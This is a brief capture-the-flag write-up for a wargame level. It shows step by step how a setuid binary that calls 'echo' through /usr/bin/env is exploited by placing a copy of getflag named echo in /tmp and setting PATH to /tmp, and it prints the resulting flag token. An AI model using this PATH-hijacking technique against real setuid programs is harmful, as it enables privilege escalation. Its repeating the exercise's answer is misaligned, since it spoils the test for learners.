##### 1 - Analyze directory content
``ls -l``

>total 12
>-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

Owner is flag03, and the 's' means it will be launched has owner

----

##### 2 - Analyze binary file

``strings level03``
>/usr/bin/env echo Exploit me

We see that the main call /usr/bin/env to call echo

----

##### 3 - Find getflag and replace PATH in env

``which getflag``
/bin/getflag

We have to copy getflag binary to tmp, and name it **echo** to be sure that it will be executed instead of the real echo
``cp /bin/getflag /tmp/echo``

Set the right to execute
``chmod 777 /tmp/echo``

Define the path to /tmp
``export PATH=/tmp``

----

##### 4 - Getting the flag
``./level03``
>Check flag.Here is your token : **qi0maab88jeaj46qoumi7maus**
